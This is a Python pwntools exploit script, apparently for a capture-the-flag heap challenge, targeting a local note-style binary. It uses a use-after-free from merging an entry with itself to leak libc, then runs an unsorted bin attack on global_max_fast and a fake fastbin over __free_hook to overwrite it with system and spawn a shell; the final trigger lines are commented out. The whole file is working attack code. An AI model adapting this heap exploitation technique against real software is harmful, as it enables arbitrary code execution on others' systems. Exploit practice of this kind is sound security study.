#!/usr/bin/env python3 

from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')

p = elf.process()
gdb.attach(p, '''
	b *malloc
	b *free
	b *realloc
''')

context.log_level = 'DEBUG'

def Insert(size, data):
	p.sendlineafter(b'Your choice: ', str(1))
	p.recvuntil(b"Length of new entry: ")
	p.sendline(str(size))
	p.recvuntil(b"Enter your data: ")
	p.sendline(data)

def Update(index, data):
	p.sendlineafter(b'Your choice: ', str(2))
	p.recvuntil(b"Entry ID: ")
	p.sendline(str(index))
	p.recvuntil(b"Length of entry: ")
	p.sendline(str(len(data)))
	p.recvuntil(b"Enter your data: ")
	p.sendline(data)

def Merge(index1, index2):
	p.sendlineafter(b'Your choice: ', str(3))
	p.recvuntil(b"Merge from Entry ID: ")
	p.sendline(str(index1))
	p.recvuntil(b"Merge to Entry ID: ")
	p.sendline(str(index2))

def Delete(index):
	p.sendlineafter(b'Your choice: ', str(4))
	p.recvuntil("Entry ID: ")
	p.sendline(str(index))

def View(index):
	p.sendlineafter(b'Your choice: ', str(5))
	p.recvuntil(b"Entry ID: ")
	p.sendline(str(index))
	p.recvline()

def List():
	p.sendlineafter(b'Your choice: ', str(6))


# Create two chunk, must prevent consolidate into topchunk
Insert(0x20, b"A" * 0x1f) # 0
Insert(0xfc, b"B" * 0xfb) # 1

# Merge 0 chunk with itself, UAF
Merge(0, 0)

# View chunk 2 to view unsorted bin ptr
View(2)

leak = u64(p.recv(8))
libc_base = leak - libc.symbols['main_arena'] - 88
global_max_fast = libc_base + libc.symbols['global_max_fast']
system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']

log.info("Leak - main_arena + 88: " + hex(leak))
log.info("Libc:                   " + hex(libc_base))
log.info("Global_max_fast:        " + hex(global_max_fast))
log.info("System:                 " + hex(system))
log.info("__free_hook:            " + hex(free_hook))


# ATtack

# Edit 2 to overwrite unsorted bin ptr, attack global_max_fast
Update(2, b"aaaaaaaa" + p64(global_max_fast-0x10) + b"C"*0xf)

# /bin/sh to free later, insert triggers unsorted bin attack
Insert(0x20, b"/bin/sh\x00" + b"D"*0x17) # 0

# Large fastbin, size appropriate for attack
Merge(1, 1)                  # 3

# Fake fastbin over free hook
payload = p64(free_hook - 0x59)
payload += b"A" * (0x1f7 - len(payload))

Update(3, payload)

Insert(0x1f8, b"Q"*0x1f7)
pause()
# Overwrite free hook
payload2 = b"\x00" * 0x49
payload2 += p64(system)
payload2 += b"\x00" * (0x1f7 - len(payload2))

# Insert(0x1f8, payload2)       # 4

# Delete(0)


p.interactive()
